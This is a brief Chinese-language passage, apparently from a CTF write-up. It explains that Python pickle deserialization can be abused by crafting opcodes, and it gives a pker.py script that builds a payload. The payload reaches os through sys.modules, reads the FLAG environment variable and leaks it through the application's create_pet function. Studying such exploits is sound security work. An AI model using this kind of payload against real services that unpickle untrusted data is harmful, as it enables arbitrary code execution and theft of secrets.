
pickle 在反序列化时会执行原本对象的`__reduce__`方法，这个方法可覆写，但由于 pickle 反序列化的字符串实际上是另一种语言，即`opcode`，因此可以通过构造`opcode`来实现多种功能。

使用 [pker.py](https://github.com/EddieIvan01/pker) 构造 opcode 调用方法，以下是 pker.py 的输入。

```python
getattr = GLOBAL('__builtin__', 'getattr')
dict = GLOBAL('builtins', 'dict')
get = getattr(dict, 'get')
mod = GLOBAL('sys', 'modules')
os = get(mod, 'os')

store_module = GLOBAL('__main__', 'store')
create_pet = getattr(store_module, 'create_pet')

getenv = getattr(os, 'getenv')
flag_value = getenv("FLAG")
create_pet(flag_value, "test")
return
```

